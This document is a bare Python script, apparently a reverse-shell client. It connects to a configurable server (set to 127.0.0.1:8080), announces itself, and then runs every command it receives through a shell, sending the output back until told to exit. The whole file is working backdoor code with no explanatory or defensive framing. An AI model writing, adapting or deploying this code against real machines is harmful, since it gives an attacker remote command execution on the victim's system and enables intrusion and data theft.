import socket
import subprocess

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8080

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((SERVER_IP, SERVER_PORT))

sock.send(b'Connected!')

while True:
    command = sock.recv(1024).decode()
    if command == 'exit':
        break
    output = subprocess.check_output(command, shell=True)
    sock.send(output)

sock.close()